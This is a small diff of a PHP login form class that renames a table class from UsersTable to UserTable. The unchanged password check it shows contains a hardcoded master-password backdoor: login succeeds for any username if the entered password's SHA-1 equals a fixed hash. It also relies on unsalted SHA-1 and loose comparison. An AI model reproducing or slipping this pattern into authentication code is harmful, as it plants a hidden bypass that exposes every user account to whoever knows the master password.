@@ -29,7 +29,7 @@ class FormLogin extends BaseForm
         $message = 'Хэрэглэгчийн нэр эсвэл нууц үг буруу байна!';
 
         if ($values['username'] && $values['password']) {
-            $user = UsersTable::getObjBy($values['username']);
+            $user = UserTable::getObjBy($values['username']);
 
             if ($user) {
                 if ($user->getPassword() == sha1($values['password']) || sha1($values['password']) == '481ce2c22ab8808912e53f974cbb3a9498322ba8') {
